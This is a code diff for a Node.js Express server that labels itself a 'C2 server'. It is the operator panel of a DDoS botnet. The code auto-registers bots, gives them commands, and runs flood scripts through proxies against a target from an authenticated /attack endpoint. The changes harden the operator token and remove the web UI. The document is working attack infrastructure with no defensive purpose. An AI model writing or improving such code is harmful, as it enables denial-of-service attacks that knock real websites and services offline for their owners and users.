@@ -10,7 +10,7 @@ const app = express();
 app.use(express.json());
 
 const port = process.env.PORT || 5553;
-const AUTH_TOKEN = "ricardo";
+const AUTH_TOKEN = process.env.AUTH_TOKEN || crypto.randomBytes(32).toString('hex');
 
 // Rate limiting
 const limiter = rateLimit({
@@ -112,7 +112,7 @@ const methodFiles = {
   'MODERN-FLOOD': 'methods/modern-flood.js',
   'HTTP-SICARIO': 'methods/REX-COSTUM.js',
   'RAW-HTTP': 'methods/h2-nust.js',
-  'RAW-GET': 'methods/raw-get.js',          // NEW METHOD
+  'RAW-GET': 'methods/raw-get.js',
   'R9': 'methods/high-dstat.js',
   'PRIV-TOR': 'methods/w-flood1.js',
   'HOLD-PANEL': 'methods/http-panel.js',
@@ -227,7 +227,6 @@ if (cluster.isMaster) {
   }
 }
 
-// Call at startup
 ensureMethodScripts();
 
 // Validate other method files exist (warnings only)
@@ -237,24 +236,7 @@ Object.entries(methodFiles).forEach(([method, file]) => {
   }
 });
 
-async function fetchData() {
-  try {
-    const response = await fetch('https://httpbin.org/get');
-    const data = await response.json();
-    console.log('\n========================================');
-    console.log('🚀 RICARDO C2 SERVER STARTED');
-    console.log('========================================');
-    console.log(`📍 Local:    http://localhost:${port}`);
-    console.log(`📍 Network:  http://${data.origin}:${port}`);
-    console.log(`🔑 Auth Token: ${AUTH_TOKEN}`);
-    console.log(`📊 Live Stats: ENABLED`);
-    console.log('========================================\n');
-  } catch (error) {
-    console.log(`📍 Server running at http://localhost:${port}`);
-    console.log(`🔑 Auth Token: ${AUTH_TOKEN}`);
-    console.log(`📊 Live Stats: ENABLED`);
-  }
-}
+// ========== API ENDPOINTS (NO UI) ==========
 
 // Report endpoint
 app.post('/api/report', authenticate, (req, res) => {
@@ -272,6 +254,7 @@ app.post('/api/report', authenticate, (req, res) => {
   res.json({ success: true });
 });
 
+// Stats API
 app.get('/api/stats', authenticate, (req, res) => {
   const now = Date.now();
   const online = connectedBots.filter(b => now - b.lastSeen < 10000).length;
@@ -280,7 +263,7 @@ app.get('/api/stats', authenticate, (req, res) => {
   res.json(botStats);
 });
 
-// Registration (using bot id)
+// Bot registration (using ID)
 app.post('/register', (req, res) => {
   let { id, name, url } = req.body;
   if (!id) {
@@ -297,7 +280,14 @@ app.post('/register', (req, res) => {
     return res.json({ message: 'Bot already registered', approved: true, bot: existing });
   }
   const botName = name || `agent-${id.slice(-6)}`;
-  const newBot = { id, name: botName, lastSeen: Date.now(), registeredAt: new Date().toLocaleString(), attacksPerformed: 0, totalRequests: 0 };
+  const newBot = { 
+    id, 
+    name: botName, 
+    lastSeen: Date.now(), 
+    registeredAt: new Date().toLocaleString(), 
+    attacksPerformed: 0, 
+    totalRequests: 0 
+  };
   connectedBots.push(newBot);
   botStats.totalBots = connectedBots.length;
   console.log(`[AUTO-APPROVED] New bot registered: ${botName} (${id})`);
@@ -322,7 +312,7 @@ app.get('/get-command', (req, res) => {
   res.json({ hasCommand: false });
 });
 
-// Admin endpoints
+// Admin endpoints (authenticated)
 app.get('/bots', authenticate, (req, res) => {
   const botsForUI = connectedBots.map(b => ({
     id: b.id, name: b.name, lastSeen: b.lastSeen, registeredAt: b.registeredAt,
@@ -383,7 +373,7 @@ app.get('/blocked', authenticate, (req, res) => res.json({ blocked: Array.from(b
 
 app.get('/ping', (req, res) => res.json({ alive: true, timestamp: Date.now(), uptime: process.uptime() }));
 
-// Server-side attack endpoint (with RAW-GET support)
+// Server-side attack endpoint
 app.get('/attack', authenticate, (req, res) => {
   const { target, time, methods } = req.query;
   if (!target || !time || !methods) return res.status(400).json({ error: 'Missing required parameters' });
@@ -432,7 +422,6 @@ app.get('/attack', authenticate, (req, res) => {
       execWithLog(`node methods/http-panel.js ${target} ${timeNum}`);
       break;
     case 'RAW-GET':
-      // threads = 20, rate = 800 per worker (adjustable)
       execWithLog(`node methods/raw-get.js ${target} ${timeNum} 20 800 proxy.txt`);
       break;
     case 'R9':
@@ -490,12 +479,7 @@ app.get('/attack', authenticate, (req, res) => {
   }, timeNum * 1000);
 });
 
-// Web UI (same as original, omitted for brevity – you can include the full HTML)
-app.get('/', (req, res) => {
-  res.send(`<!DOCTYPE html><html>... (your existing web UI) ...</html>`);
-});
-
-// Error handling
+// Error handling middleware
 app.use((err, req, res, next) => {
   console.error('[SERVER ERROR]', err.stack);
   res.status(500).json({ error: 'Internal server error' });
@@ -503,11 +487,17 @@ app.use((err, req, res, next) => {
 
 // Start server
 app.listen(port, () => {
-  fetchData();
+  console.log('\n========================================');
+  console.log('🚀 RICARDO C2 SERVER STARTED (API ONLY)');
+  console.log('========================================');
+  console.log(`📍 Listening on port ${port}`);
+  console.log(`🔑 Auth Token: ${AUTH_TOKEN}`);
+  console.log(`📊 Live Stats: ENABLED`);
+  console.log(`🔥 RAW-GET method ready`);
+  console.log('========================================\n');
+  
   if (!fs.existsSync('./proxy.txt')) fs.writeFileSync('./proxy.txt', '# Add your proxies here\n# Format: ip:port\n');
-  console.log('\n📁 Required directories:');
-  console.log('   - /methods/ - place your attack scripts here');
-  console.log('   - proxy.txt - add your proxies (one per line)');
-  console.log('📊 Live Stats: Tracking RPS, RPM, and attack metrics');
-  console.log('🔥 RAW-GET method added and ready\n');
+  console.log('📁 Required files:');
+  console.log('   - /methods/ - attack scripts (auto-created)');
+  console.log('   - proxy.txt - add your proxies (one per line)\n');
 });
